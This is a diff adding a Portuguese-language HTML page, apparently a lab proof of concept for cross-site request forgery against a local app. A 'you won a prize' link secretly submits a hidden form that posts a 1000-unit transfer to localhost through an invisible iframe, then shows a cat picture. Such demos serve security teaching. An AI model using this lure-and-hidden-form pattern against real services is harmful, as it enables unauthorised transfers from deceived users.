@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Teste</title>
+  <style>
+    #cat {
+      display: none;
+      margin-top: 20px;
+      max-width: 300px;
+    }
+    a {
+      cursor: pointer;
+      color: blue;
+      text-decoration: underline;
+    }
+    iframe {
+      display: none;
+    }
+  </style>
+</head>
+  <body>
+    <h1>Você ganhou um prêmio 🎁</h1>
+    <a id="magic-link" href="#">Clique aqui para receber!</a>
+
+    <form action="http://localhost:8080/transfer" method="POST" id="csrf-form" target="hidden-frame">
+      <input type="hidden" id="amount" name="amount" value="1000">
+    </form>
+    <iframe name="hidden-frame"></iframe>
+
+    <div id="cat">
+      <img src="./gatinho.jpeg" alt="gatinho fofo">
+      <h3>Você ganhou um gatinho!</h3>
+    </div>
+
+    <script>
+      document.getElementById("magic-link").addEventListener("click", function () {
+        document.getElementById("csrf-form").submit();
+        document.getElementById("cat").style.display = "block";
+      });
+    </script>
+  </body>
+</html>
